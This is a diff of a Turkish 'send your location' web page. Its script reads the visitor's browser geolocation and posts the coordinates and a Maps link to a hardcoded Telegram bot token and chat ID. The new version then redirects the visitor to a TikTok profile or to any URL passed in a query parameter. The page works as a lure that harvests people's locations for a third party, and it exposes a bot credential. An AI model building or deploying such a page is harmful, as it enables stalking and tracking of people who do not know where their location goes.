@@ -1,66 +1,47 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <title>Konum Gönderici</title>
-  <style>
-    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
-    button {
-      font-size: 18px; padding: 15px 25px; cursor: pointer;
-      border: none; border-radius: 8px; background: #007bff; color: white;
-    }
-    button:hover { background: #0056b3; }
-    #status { margin-top: 20px; font-weight: bold; }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Konum Gönder</title>
 </head>
 <body>
-  <h1>Konum Gönderici</h1>
+  <h2>Konumunuzu Gönderin</h2>
   <button id="sendLocationBtn">📍 Konumumu Gönder</button>
-  <p id="status"></p>
 
   <script>
-    const BOT_TOKEN = "7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA";
-    const CHAT_ID = "6358000072";
+    const params = new URLSearchParams(window.location.search);
+    const redirectUrl = params.get('redirect') || "https://www.tiktok.com/@ilayda.yldrm84";
 
-    const statusEl = document.getElementById("status");
-    const btn = document.getElementById("sendLocationBtn");
-
-    btn.addEventListener("click", () => {
-      statusEl.textContent = "📍 Konum alınıyor...";
+    document.getElementById("sendLocationBtn").addEventListener("click", () => {
       if (!navigator.geolocation) {
-        statusEl.textContent = "❌ Tarayıcınız konum desteği sunmuyor.";
+        alert("Tarayıcınız konum desteklemiyor.");
         return;
       }
 
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          statusEl.textContent = "✅ Konum alındı, Telegram'a gönderiliyor...";
+      navigator.geolocation.getCurrentPosition(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
 
-          fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: CHAT_ID,
-              text: 📍 Konum alındı:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}
-            }),
+        fetch("https://api.telegram.org/bot7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: "6358000072",
+            text: 📍 Yeni Konum:\nEnlem: ${lat}\nBoylam: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}
           })
-          .then(res => {
-            if (res.ok) {
-              statusEl.textContent = "✅ Telegram'a başarıyla gönderildi.";
+        }).then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              alert("Konum başarıyla gönderildi!");
+              window.location.href = redirectUrl;
             } else {
-              statusEl.textContent = "❌ Telegram'a gönderilemedi.";
+              alert("Telegram mesajı gönderilemedi!");
             }
-          })
-          .catch(() => {
-            statusEl.textContent = "❌ Telegram gönderiminde hata oluştu.";
-          });
-        },
-        error => {
-          statusEl.textContent = "❌ Konum alınamadı: " + error.message;
-        }
-      );
+          }).catch(() => alert("Bir hata oluştu!"));
+      }, error => {
+        alert("Konum alınamadı: " + error.message);
+      });
     });
   </script>
 </body>
